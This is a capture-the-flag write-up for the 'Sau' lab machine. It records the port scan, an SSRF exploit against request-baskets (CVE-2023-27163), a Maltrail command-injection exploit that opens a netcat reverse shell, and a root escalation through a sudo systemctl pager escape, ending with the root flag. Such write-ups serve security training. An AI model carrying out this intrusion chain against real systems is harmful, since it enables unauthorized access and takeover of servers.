## Sau

### Lab Details 

- Difficulty: Easy
- Type: Web App, Priv Esc, Linux

#### Tasks
Q1: Which is the highest open TCP port on the target machine?
- run nmap `nmap -sT -T4 -vv -A -p- -Pn -oA Sau 10.10.11.224`
```
<snip>
55555/tcp open  http    syn-ack Golang net/http server
| http-title: Request Baskets
|_Requested resource was /web
| http-methods: 
|_  Supported Methods: GET OPTIONS
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Tue, 03 Jun 2025 18:44:56 GMT
|     Content-Length: 75
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
|   GenericLines, Help, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, Socks5: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Tue, 03 Jun 2025 18:44:36 GMT
|     Content-Length: 27
|     href="/web">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Tue, 03 Jun 2025 18:44:37 GMT
|     Content-Length: 0
|   OfficeScan: 
|     HTTP/1.1 400 Bad Request: missing required Host header
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|_    Request: missing required Host header
<snip>
```

Q2/3: What is the name of the open source software that the application on 55555 is "powered by"?
- we can try curl the website and we get below info on the web app
```
$ curl http://10.10.11.224:55555/web
<snip>
   <small>
          Powered by <a href="https://github.com/darklynx/request-baskets">request-baskets</a> |
          Version: 1.2.1
        </small>
<snip>
```

Q4: What is the 2023 CVE ID for a Server-Side Request Forgery (SSRF) in this version of request-baskets?
- searched online and found CVE-2023-27163

Q5: What is the name of the software that the application running on port 80 is "powered by"?
- found a POC for CVE-2023-27163, https://github.com/entr0pie/CVE-2023-27163
- the POC utilizes the exploit and use a basket as proxy to internal port on target
```
$ ./CVE-2023-27163.sh http://10.10.11.224:55555/ http://127.0.0.1:80/   
Proof-of-Concept of SSRF on Request-Baskets (CVE-2023-27163) || More info at https://github.com/entr0pie/CVE-2023-27163

> Creating the "phfxzv" proxy basket...
> Basket created!
> Accessing http://10.10.11.224:55555/phfxzv now makes the server request to http://127.0.0.1:80/.
> Authorization: VCqijliagnSYDQATcYyI7PreVBXKMNxaLRGDi8oLsdq-
```
- once the proxy is setup we can access the internal port on target, using curl as an example 
```
$: curl  http://10.10.11.224:55555/phfxzv
<snip>
<div id="bottom_blank"></div>
        <div class="bottom noselect">Powered by <b>M</b>altrail (v<b>0.53</b>)</div>
<snip>
```

Q6: There is an unauthenticated command injection vulnerability in MailTrail v0.53. What is the relative path on the webserver targeted by this exploit?
- searched online and found POC for the app https://github.com/spookier/Maltrail-v0.53-Exploit
- run the exploit and we get a reverse shell 
- POC is targeting the /login 
```
$: cat exploit.py
<snip>
        target_URL = sys.argv[3] + "/login"
<snip>
```

Q7: What system user is the Mailtrack application running as on Sau?
- whoami on target
```
nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.35] from (UNKNOWN) [10.10.11.224] 43172
$ whoami
whoami
puma
```

Q8: What is the full path to the binary (without arguments) the puma user can run as root on Sau?
- use `sudo -l` to check
```
$ sudo -l
sudo -l
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

Q9: What is the full version string for the instance of systemd installed on Sau?
- check with `systemctl --version`
```
$ systemctl --version
systemctl --version
systemd 245 (245.4-4ubuntu3.22)
+PAM +AUDIT +SELINUX +IMA +APPARMOR +SMACK +SYSVINIT +UTMP +LIBCRYPTSETUP +GCRYPT +GNUTLS +ACL +XZ +LZ4 +SECCOMP +BLKID +ELFUTILS +KMOD +IDN2 -IDN +PCRE2 default-hierarchy=hybrid
```

Q10: What is the 2023 CVE ID for a local privilege escalation vulnerability in this version of systemd?
- since we can run systemct as root without a password we can try privilege escalate using a method in  https://gtfobins.github.io/gtfobins/systemctl/
```
$ sudo /usr/bin/systemctl status trail.service
sudo /usr/bin/systemctl status trail.service
WARNING: terminal is not fully functional
-  (press RETURN)!/bin/sh
!//bbiinn//sshh!/bin/sh
# whoami
whoami
root
# cat /root/root.txt
cat /root/root.txt
c59730ba712fc8b9acf87109b9b71f8e
```




#### Resources

#### Lesson Learned
